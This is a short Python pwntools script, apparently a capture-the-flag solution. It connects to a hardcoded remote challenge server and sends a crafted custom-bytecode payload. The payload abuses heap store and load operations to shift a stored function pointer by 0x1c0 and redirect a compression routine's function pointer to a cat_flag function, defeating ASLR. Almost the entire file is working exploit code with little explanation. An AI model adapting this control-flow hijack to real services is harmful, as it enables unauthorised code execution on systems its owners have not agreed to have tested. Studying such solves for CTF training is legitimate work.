#!/usr/bin/env python
from pwn import *

# YouNeedReallyGoodBugToBreakASLR!!

context.arch = 'amd64'
host , port = '110.10.147.111' , 4141
y = remote( host , port )


def read_heap( count , data ):
    return p8( (0<<6) + count ) + data

def store_heap( i ):
    return p8( (3<<6) + i )

def load_heap( i , j ):
    return p8( (1<<6) + i ) + p8( j )

def new_heap_loop( count ):
    return p8( (2<<6) + count )


p = ''
p += "\xc0\xd3\x94#2019"
p += p64( 0x77777770 )

p += store_heap( 0x34 )           # store output_func() to heap
p += load_heap( 0x33 , 1 )        # load it to Compress->size

p += new_heap_loop( 0x1c0 / 8 )   # Compress->size += 0x1c0 -> output_func() + 0x1c0 = cat_falg()

p += store_heap( 0x33 )           # store cat_flag() to heap 
p += load_heap( 0x34 , 1 )        # load cat_flag() to Compress->func_ptr
                                  # Trigger Compress->func_ptr, trigger cat_flag()
y.send( p32( len( p ) ) )
y.send( p )

y.interactive()